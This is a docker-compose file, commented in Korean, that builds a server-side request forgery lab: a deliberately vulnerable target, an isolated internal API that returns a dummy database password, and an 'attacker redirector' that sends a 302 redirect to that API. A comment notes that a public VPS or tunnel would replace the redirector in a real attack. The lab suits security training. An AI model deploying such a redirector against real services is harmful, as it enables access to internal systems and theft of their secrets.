version: '3.8'

services:

  # ── 취약한 타깃 서버 ─────────────────────────────────────
  target:
    build:
      context: .
      dockerfile: Dockerfile.target
    ports:
      - "5000:5000"
    networks:
      - internal
      - external

  # ── 내부망 전용 비밀 서비스 ──────────────────────────────
  # external 네트워크에 연결되지 않아 외부에서 직접 접근 불가
  # target 컨테이너를 통해서만(SSRF) 접근 가능
  internal-api:
    image: python:3.11-alpine
    command: >
      python -c "
      from http.server import BaseHTTPRequestHandler, HTTPServer
      import json
      class H(BaseHTTPRequestHandler):
          def do_GET(self):
              self.send_response(200)
              self.send_header('Content-Type', 'application/json')
              self.end_headers()
              payload = {
                  'access': 'INTERNAL_ONLY',
                  'db_host': 'db.internal',
                  'db_password': 'sup3r_s3cr3t_pw',
                  'message': '이 응답이 보이면 내부 서비스에 도달한 것 (SSRF 성공)'
              }
              self.wfile.write(json.dumps(payload, ensure_ascii=False).encode())
          def log_message(self, *a): pass
      HTTPServer(('0.0.0.0', 8080), H).serve_forever()
      "
    networks:
      - internal   # 내부망에만! external 없음

  # ── 공격자 리다이렉터 ────────────────────────────────────
  # 302 응답으로 internal-api 로 유도하는 공격자 서버 시뮬레이션
  # 실제 공격에서는 VPS + localhost.run 등으로 대체
  attacker-redirector:
    image: python:3.11-alpine
    command: >
      python -c "
      from http.server import BaseHTTPRequestHandler, HTTPServer
      class H(BaseHTTPRequestHandler):
          def do_GET(self):
              self.send_response(302)
              self.send_header('Location', 'http://internal-api:8080/')
              self.end_headers()
          def log_message(self, *a): pass
      HTTPServer(('0.0.0.0', 9000), H).serve_forever()
      "
    ports:
      - "9000:9000"
    networks:
      - internal
      - external

networks:
  internal:
    internal: true   # 이 네트워크는 외부 인터넷과 완전히 격리
  external:
